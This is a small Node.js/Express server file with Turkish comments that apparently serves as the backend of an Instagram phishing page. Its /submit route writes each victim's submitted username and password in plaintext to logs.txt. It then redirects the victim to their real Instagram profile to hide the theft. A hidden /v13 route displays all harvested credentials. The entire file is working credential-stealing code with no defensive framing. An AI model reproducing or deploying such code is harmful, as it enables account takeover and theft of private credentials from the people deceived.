const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // Logları kaydet
  const log = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile('logs.txt', log, (err) => {
    if (err) throw err;
    console.log('SUCCESS !');
  });

  res.redirect(`https://www.instagram.com/${username}`);
});

app.get('/v13', (req, res) => {
  fs.readFile('logs.txt', 'utf8', (err, data) => {
    if (err) throw err;
    res.send(`<pre>${data}</pre>`);
  });
});

app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor.`);
});
